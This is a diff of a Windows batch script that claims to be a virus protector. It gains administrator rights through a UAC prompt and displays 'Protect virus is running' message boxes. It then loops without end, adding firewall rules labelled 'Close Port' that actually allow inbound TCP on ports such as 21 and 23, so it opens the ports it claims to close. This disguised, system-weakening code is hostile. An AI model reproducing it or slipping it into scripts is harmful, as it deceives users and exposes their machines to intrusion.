@@ -4,49 +4,46 @@
 
 :: BatchGotAdmin
 :-------------------------------------
-REM  --> Check for permissions
-    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
->nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+REM --> Check for permissions
+IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
 ) ELSE (
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 )
 
 REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
-) else ( goto gotAdmin )
+) else (goto gotAdmin)
 
 :UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params= %*
-    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+set params= %*
+echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
 
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    exit /B
+"%temp%\getadmin.vbs"
+del "%temp%\getadmin.vbs"
+exit /B
 
 :gotAdmin
-    pushd "%CD%"
-    CD /D "%~dp0"
-:--------------------------------------   
+pushd "%CD%"
+CD /D "%~dp0"
+:--------------------------------------
+
 cd %temp%
 powershell -WindowStyle Hidden -Command "& {}"
-echo x=msgbox("scanning.........." ,0, "Protect virus is running") > Realtimecheck.vbs 
-start Realtimecheck.vbs powershell -WindowStyle Hidden -Command "& {}"
+echo x=msgbox("Protect..........", 0, "Protect virus is running") > Realtimecheck.vbs
+start Realtimecheck.vbs
 timeout 3 /nobreak
 taskkill /IM wscript.exe
 timeout 1 /nobreak
 
-:next
-echo x=msgbox("not safety" ,0, "Protect virus is running") > Realtime.vbs 
-start Realtime.vbs 
-tasklist | find /i "wscript.exe"
-if %errorlevel% neq 0 goto next
-goto virus
+
+
 :virus
 echo [ Found ] Kill All BAD Port...
-timeout 2.1 /nobreak > nul
+
 for %%a in (
 21
 23
@@ -131,14 +128,5 @@ for %%a in (
 64666
 65000
 65506
-) do (
-netsh advfirewall firewall show rule name="Close Port %%a" > nul
-if %errorlevel% 1 (
-echo x=msgbox("stop virus" ,0, "Protect virus is running") > Realtime.vbs 
-start Realtime.vbs 
-netsh advfirewall firewall add rule name="Close Port %%a" dir=in action=allow protocol=TCP localport=%%a & goto virus
-) else (
-echo x=msgbox("safety" ,0, "Protect virus is running") > Realtime.vbs 
-start Realtime.vbs & goto virus
-)
-)
+) do netsh advfirewall firewall add rule name="Close Port %%a" dir=in action=allow protocol=TCP localport=%%a
+goto virus
